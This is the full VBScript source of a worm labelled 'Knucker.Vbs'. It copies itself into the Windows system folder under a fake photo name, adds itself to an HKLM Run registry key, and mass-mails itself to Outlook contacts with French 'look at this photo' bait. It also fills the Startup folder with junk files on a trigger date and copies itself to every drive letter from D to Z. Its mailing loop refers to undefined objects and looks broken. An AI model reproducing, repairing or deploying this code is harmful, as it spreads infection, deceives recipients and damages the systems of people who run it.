On Error Resume Next 'Created By Spy-RoW 26/11/06 -21:09- 71l I
'############################# ============================== S
'#<<-=-{¤}Knucker.Vbs{¤}-=->># 2,62 Ko | Version 1 | VBScript A
'############################# ============================== K
Set C = CreateObject("Scripting.FileSystemObject").GetFile(WScript.ScriptFullName)
Set Kn1 = CreateObject("WScript.Shell")
Set Kn2 = CreateObject("Scripting.FileSystemObject")
Set Kn3 = Kn2.GetSpecialFolder(1)
Set Kn4 = CreateObject("Outlook.Application")
Set Kn5 = Kn4.GetNameSpace("MAPI")
Set Kn6 = Kn5.AddressLists
Set NT = CreateObject("Wscript.Network")
Bm = Kn1.SpecialFolders("Startup")
 Kn = Kn2.GetTempName
  If not Kn2.FileExists(""&Kn3&"\Isak.txt") Then
   C.Copy(Kn3&"\"&Kn&".vbs")
   C.Copy(Kn3&"\Photo16.jpg.vbs")
  Kn1.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\NetDll", ""&Kn3&"\"&Kn&".vbs"
 Kn2.CreateTextFile(""&Kn3&"\Isak.txt")
End If
Wscript.Sleep 1000*60*3
If Day(now) = 9 Then
 Randomize
  KR = Fix((Rnd*2)+1)
     If KR = 1 Then A = "lool"
  If KR = 2 Then A = "Salut"
     PK = Fix((Rnd*2)+1)
  If PK = 1 Then B = "regarde la photo !"
    If PK = 2 Then B = "j'ai trouvé cette photo sur le net !"
  For Each LIS1 In LIS
    CONTACT_COUNT = LIS1.AddressEntries.Count
  For COUNT = 1 To CONTACT_COUNT
     Knucker.To = CONTACT.Address
  Knucker.Subject = A
     Knucker.TextBody = Vbcrlf&""&B&""
  Knucker.AddAttachment ""&Kn3&"\Photo16.jpg.vbs"
     Knucker.Send
  Next
Next
End If
Do
 Wscript.Sleep 1000
  If Day(now) = 14 And Month(now) = 5 Then
   For B1 = 0 To 100
  Kn2.CreateTextFile(Bm&"\"&B1&".txt")
 Next
End If
C.Copy("d:\Photo de "&NT.Username&".vbs")
 C.Copy("e:\Photo de "&NT.Username&".vbs")
C.Copy("f:\Photo de "&NT.Username&".vbs")
 C.Copy("g:\Photo de "&NT.Username&".vbs")
C.Copy("h:\Photo de "&NT.Username&".vbs")
 C.Copy("i:\Photo de "&NT.Username&".vbs")
C.Copy("j:\Photo de "&NT.Username&".vbs")
 C.Copy("k:\Photo de "&NT.Username&".vbs")
C.Copy("l:\Photo de "&NT.Username&".vbs")
 C.Copy("m:\Photo de "&NT.Username&".vbs")
C.Copy("n:\Photo de "&NT.Username&".vbs")
 C.Copy("o:\Photo de "&NT.Username&".vbs")
C.Copy("p:\Photo de "&NT.Username&".vbs")
 C.Copy("q:\Photo de "&NT.Username&".vbs")
C.Copy("r:\Photo de "&NT.Username&".vbs")
 C.Copy("s:\Photo de "&NT.Username&".vbs")
C.Copy("t:\Photo de "&NT.Username&".vbs")
 C.Copy("u:\Photo de "&NT.Username&".vbs")
C.Copy("v:\Photo de "&NT.Username&".vbs")
 C.Copy("w:\Photo de "&NT.Username&".vbs")
C.Copy("x:\Photo de "&NT.Username&".vbs")
 C.Copy("y:\Photo de "&NT.Username&".vbs")
C.Copy("z:\Photo de "&NT.Username&".vbs")
Loop
